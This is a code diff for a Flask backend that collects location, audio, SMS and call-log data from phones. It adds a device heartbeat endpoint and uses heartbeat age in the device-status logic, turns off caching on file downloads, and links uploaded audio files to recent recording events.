@@ -1,6 +1,6 @@
 from flask import Blueprint, request, jsonify, current_app, Response, send_from_directory, send_file
 from flask_login import login_required, current_user
-from .models import Upload, DeviceLocation, RecordingEvent, DeviceInfo, DeviceCommand, AuditLog, User, SmsMessage, CallLog, db
+from .models import Upload, DeviceLocation, RecordingEvent, DeviceInfo, DeviceCommand, AuditLog, User, SmsMessage, CallLog, DeviceHeartbeat, db
 from .device_utils import resolve_to_device_id, validate_identifier_format, get_android_id_for_device
 from .auth.permissions import require_permission, require_role, ROLE_PERMISSIONS
 from .utils.audit import log_device_action, log_data_access, log_permission_denied, AuditActions
@@ -190,7 +190,7 @@ def get_device_recording_status(device_id):
 
 
 def get_device_status(device_id):
-    """Calculate real-time device status based on events, location, and uploads"""
+    """Calculate real-time device status based on events, location, uploads, and heartbeats"""
     try:
         # Get latest location using new date/time structure
         latest_location = DeviceLocation.query.filter_by(device_id=device_id)\
@@ -202,6 +202,9 @@ def get_device_status(device_id):
         # Also check for recent uploads as a sign of device activity
         latest_upload = Upload.query.filter_by(device_id=device_id)\
             .order_by(Upload.timestamp.desc()).first()
+        
+        # Fetch device_info for quick heartbeat lookup (DeviceInfo.last_heartbeat)
+        device_info = DeviceInfo.query.filter_by(device_id=device_id).first()
         
         now = datetime.utcnow()
         
@@ -221,8 +224,14 @@ def get_device_status(device_id):
         if latest_upload:
             upload_age_minutes = (now - latest_upload.timestamp).total_seconds() / 60
         
-        # Use the most recent activity (location, upload, or event) for determining connectivity
-        most_recent_activity_minutes = min(location_age_minutes, upload_age_minutes)
+        # Calculate heartbeat age using DeviceInfo.last_heartbeat (fast path)
+        heartbeat_age_minutes = 999
+        if device_info and device_info.last_heartbeat:
+            hb_dt = device_info.last_heartbeat
+            heartbeat_age_minutes = (now - hb_dt).total_seconds() / 60
+        
+        # Use the most recent activity (location, upload, heartbeat, or event) for determining connectivity
+        most_recent_activity_minutes = min(location_age_minutes, upload_age_minutes, heartbeat_age_minutes)
         
         # Status priority logic
         # 1. Critical: Device offline (no activity in 7+ minutes)
@@ -2559,8 +2568,16 @@ def download_file(filename):
         # Flask-CORS will handle CORS headers automatically
         # No manual CORS headers needed - this was causing the wildcard '*' conflict
         
-        # Add caching headers for better performance
-        response.headers['Cache-Control'] = 'public, max-age=3600'
+        # FIX: Disable caching to prevent playing old audio on new recordings
+        # Previous issue: Browser would cache audio for 1 hour and serve stale content
+        response.headers['Cache-Control'] = 'no-cache, no-store, must-revalidate'
+        response.headers['Pragma'] = 'no-cache'
+        response.headers['Expires'] = '0'
+        
+        # Add ETag for proper file versioning
+        file_stat = os.stat(file_path)
+        etag = f'"{file_stat.st_mtime}-{file_stat.st_size}"'
+        response.headers['ETag'] = etag
         
         return response
         
@@ -2812,6 +2829,29 @@ def upload_audio_endpoint():
                 longitude=None
             )
             db.session.add(upload)
+            
+            # **CRITICAL FIX**: Link this audio file to recent recording event
+            # Find recent recording events without audio_file_id for this device
+            recent_events = (
+                RecordingEvent.query
+                .filter_by(device_id=phone_id)
+                .filter(RecordingEvent.audio_file_id.is_(None))
+                .filter(RecordingEvent.start_timestamp.isnot(None))
+                .order_by(RecordingEvent.start_timestamp.desc())
+                .limit(3)  # Check last 3 events
+                .all()
+            )
+            
+            # Link to the most recent event within 30 minutes
+            upload_time = datetime.now()
+            for event in recent_events:
+                if event.start_timestamp:
+                    time_diff = abs((upload_time - event.start_timestamp).total_seconds())
+                    if time_diff <= 1800:  # 30 minutes
+                        event.audio_file_id = filename
+                        print(f"Linked audio {filename} to recording event {event.id} (time_diff: {time_diff}s)")
+                        break
+            
             db.session.commit()
         except Exception as db_error:
             print(f"Database error (continuing anyway): {db_error}")
@@ -3333,6 +3373,93 @@ def receive_location_data():
 
     except Exception as e:
         print(f"Receive location data error: {e}")
+        return jsonify({'error': str(e)}), 500
+
+
+@routes.route('/api/external/heartbeat', methods=['POST'])
+def receive_device_heartbeat():
+    """Receive lightweight heartbeat signal when GPS location is unavailable"""
+    try:
+        data = request.get_json()
+        
+        if not data:
+            return jsonify({'error': 'No JSON data provided'}), 400
+
+        device_id = data.get('device_id')
+        timestamp_str = data.get('timestamp')
+        reason = data.get('reason', 'unknown')
+        
+        # Battery information (optional)
+        battery_percentage = data.get('battery_percentage')
+        battery_charging = data.get('battery_charging')
+        battery_status = data.get('battery_status')
+        charging_method = data.get('charging_method')
+        
+        if not device_id:
+            return jsonify({'error': 'Missing required field: device_id'}), 400
+
+        # Parse timestamp
+        try:
+            if timestamp_str:
+                timestamp_dt = datetime.fromisoformat(timestamp_str.replace('Z', '+00:00'))
+            else:
+                timestamp_dt = datetime.utcnow()
+        except:
+            timestamp_dt = datetime.utcnow()
+
+        # Save heartbeat to database and update device's last_heartbeat for fast lookup
+        from . import db
+        from .models import DeviceHeartbeat, DeviceInfo
+
+        # Update or create compact last-heartbeat on DeviceInfo (fast lookup)
+        device_info = DeviceInfo.query.filter_by(device_id=device_id).first()
+        if not device_info:
+            device_info = DeviceInfo(device_id=device_id)
+            db.session.add(device_info)
+
+        device_info.last_heartbeat = timestamp_dt
+        device_info.last_heartbeat_reason = reason
+        device_info.updated_at = datetime.utcnow()
+
+        # Insert a history row only if the previous heartbeat is older than threshold
+        insert_history = True
+        try:
+            last_hb = DeviceHeartbeat.query.filter_by(device_id=device_id)\
+                .order_by(DeviceHeartbeat.timestamp.desc()).first()
+            if last_hb:
+                delta = (timestamp_dt - last_hb.timestamp).total_seconds()
+                # If last heartbeat was less than 2 minutes ago, skip inserting duplicate history
+                if delta >= 0 and delta < (2 * 60):
+                    insert_history = False
+        except Exception:
+            # If any error occurs while checking last heartbeat, fall back to inserting
+            insert_history = True
+
+        if insert_history:
+            heartbeat = DeviceHeartbeat(
+                device_id=device_id,
+                timestamp=timestamp_dt,
+                reason=reason,
+                battery_percentage=battery_percentage,
+                battery_charging=battery_charging,
+                battery_status=battery_status,
+                charging_method=charging_method
+            )
+            db.session.add(heartbeat)
+
+        db.session.commit()
+
+        current_app.logger.info(f"💓 Heartbeat received from {device_id}: {reason} (history_inserted={insert_history})")
+
+        return jsonify({
+            'status': 'success',
+            'message': f'Heartbeat received for device {device_id}',
+            'timestamp': timestamp_dt.isoformat(),
+            'history_inserted': insert_history
+        }), 200
+
+    except Exception as e:
+        current_app.logger.error(f"Receive heartbeat error: {e}")
         return jsonify({'error': str(e)}), 500
 
 
@@ -4291,7 +4418,16 @@ def download_external_file(filename):
         
         # Serve file
         response = send_from_directory(upload_folder, filename)
-        response.headers['Cache-Control'] = 'public, max-age=3600'
+        
+        # FIX: Disable caching to prevent serving stale files
+        response.headers['Cache-Control'] = 'no-cache, no-store, must-revalidate'
+        response.headers['Pragma'] = 'no-cache'
+        response.headers['Expires'] = '0'
+        
+        # Add ETag for proper file versioning
+        file_stat = os.stat(file_path)
+        etag = f'"{file_stat.st_mtime}-{file_stat.st_size}"'
+        response.headers['ETag'] = etag
         
         return response
         
